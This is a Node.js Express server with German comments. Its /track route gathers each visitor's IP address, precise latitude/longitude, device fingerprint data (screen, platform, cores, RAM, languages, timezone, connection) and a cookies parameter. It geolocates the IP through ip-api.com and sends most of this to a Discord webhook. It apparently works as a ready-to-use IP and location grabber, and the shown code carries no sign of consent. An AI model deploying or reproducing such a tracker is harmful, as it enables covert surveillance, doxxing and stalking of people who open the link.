// server.js — Discord Tracking ohne DB
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.json());

// Static-Ordner (liefert public/index.html aus)
const publicDir = path.join(__dirname, 'public');
app.use(express.static(publicDir));

// Health Check für Render
app.get('/health', (_, res) => res.send('ok'));

// Root -> index.html ausliefern
app.get('/', (_, res) => {
  res.sendFile(path.join(publicDir, 'index.html'));
});

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// IP ermitteln (auch hinter Proxy)
function getClientIp(req) {
  const xf = req.headers['x-forwarded-for'] || req.headers['x-real-ip'];
  if (xf) return String(xf).split(',')[0].trim().replace(/^::ffff:/, '');
  return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
}

// Track-Route — nimmt Daten aus Query und postet an Discord
app.get('/track', async (req, res) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const timestamp = new Date().toISOString();

  const {
    lat, lon, language, languages, cookies, screen, window: win,
    timezone, platform, hardwareConcurrency, deviceMemory, connection,
    referrer
  } = req.query;

  // optional: IP-Geolocation (ergänzt Stadt/Land)
  let location = {};
  try {
    const r = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 4000 });
    if (r?.data?.status === 'success') {
      location = {
        city: r.data.city,
        region: r.data.regionName || r.data.region,
        country: r.data.country,
        latitude: lat || r.data.lat,
        longitude: lon || r.data.lon,
        isp: r.data.isp
      };
    }
  } catch { /* ignorieren */ }

  // Discord Embed bauen
  const embeds = [{
    title: 'Tracking-Daten',
    color: 0x2b90d9,
    fields: [
      { name: 'IP', value: String(ip || '–'), inline: true },
      { name: 'User-Agent', value: (userAgent || '–').slice(0, 256), inline: false },
      { name: 'Zeitzone', value: String(timezone || '–'), inline: true },
      { name: 'Referrer', value: String(referrer || '–'), inline: false },
      { name: 'Language(s)', value: String(language || languages || '–').slice(0, 256), inline: true },
      { name: 'Platform', value: String(platform || '–'), inline: true },
      { name: 'HW / RAM', value: `Cores: ${hardwareConcurrency || '–'} | RAM: ${deviceMemory || '–'}`, inline: true },
      { name: 'Screen', value: String(screen || '–').slice(0, 256), inline: false },
      { name: 'Window', value: String(win || '–').slice(0, 256), inline: false },
      { name: 'Netz', value: String(connection || '–').slice(0, 256), inline: false },
      {
        name: 'Location',
        value: (location.latitude && location.longitude)
          ? `Lat, Lon: ${location.latitude}, ${location.longitude}\n${location.city || ''} ${location.region || ''} ${location.country || ''}${location.isp ? `\nISP: ${location.isp}` : ''}`
          : (location.city || location.country ? `${location.city || ''} ${location.region || ''} ${location.country || ''}` : '–'),
        inline: false
      }
    ],
    timestamp
  }];

  // an Discord senden
  if (DISCORD_WEBHOOK_URL) {
    try {
      await axios.post(DISCORD_WEBHOOK_URL, {
        content: `📡 **Neuer Track** — ${timestamp}`,
        embeds
      }, { timeout: 5000 });
    } catch (e) {
      console.error('Discord-Webhook-Fehler:', e.response?.status, e.response?.data || e.message);
    }
  } else {
    console.warn('Kein DISCORD_WEBHOOK_URL gesetzt – überspringe Discord-Post.');
  }

  res.send('Daten empfangen');
});

// Serverstart
app.listen(port, () => {
  console.log(`Server läuft auf Port ${port}`);
});


